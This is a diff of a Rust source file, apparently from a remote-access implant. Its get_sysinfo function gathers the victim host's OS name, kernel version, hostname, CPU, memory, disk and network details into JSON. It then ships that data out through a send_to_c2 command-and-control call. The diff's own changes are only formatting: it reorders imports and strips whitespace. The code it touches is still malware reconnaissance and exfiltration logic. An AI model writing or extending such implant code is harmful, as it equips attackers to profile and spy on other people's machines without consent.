@@ -1,12 +1,12 @@
+use crate::connexion::send_to_c2;
+use serde_json::json;
 use std::error::Error;
 use sysinfo::{Disks, Networks, System};
-use serde_json::json;
-use crate::connexion::send_to_c2;
 
 pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
     let mut sys = System::new();
     sys.refresh_all();
-   
+
     let disks = Disks::new_with_refreshed_list();
     let disk_details: Vec<_> = disks
         .iter()
@@ -14,7 +14,7 @@ pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
             let total = disk.total_space() as f64;
             let available = disk.available_space() as f64;
             let used = total - available;
-            
+
             json!({
                 "name": disk.name().to_string_lossy(),
                 "mount_point": disk.mount_point().to_string_lossy(),
@@ -30,7 +30,7 @@ pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
             })
         })
         .collect();
-   
+
     let networks = Networks::new_with_refreshed_list();
     let network_details: Vec<_> = networks
         .iter()
@@ -41,17 +41,17 @@ pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
             })
         })
         .collect();
-    
+
     let cpu_info = json!({
         "cores": sys.cpus().len(),
         "brand": sys.cpus().first().map(|cpu| cpu.brand()).unwrap_or("Unknown"),
         "frequency_mhz": sys.cpus().first().map(|cpu| cpu.frequency()).unwrap_or(0),
     });
-    
+
     let memory_info = json!({
         "total_mb": sys.total_memory() / 1024,
     });
-    
+
     let json = json!({
         "Name": System::name().unwrap_or_else(|| "Unknown".to_string()),
         "Kernel Version": System::kernel_version().unwrap_or_else(|| "Unknown".to_string()),
@@ -59,11 +59,11 @@ pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
         "System hostname": System::host_name().unwrap_or_else(|| "Unknown".to_string()),
         "CPU": cpu_info,
         "Memory": memory_info,
-        "Disks Details": disk_details,  
+        "Disks Details": disk_details,
         "Total Disks": disks.len(),
         "Network Details": network_details,
     });
-   
+
     let json_string = serde_json::to_string(&json)?;
     send_to_c2(json_string.into_bytes()).await?;
     Ok(())
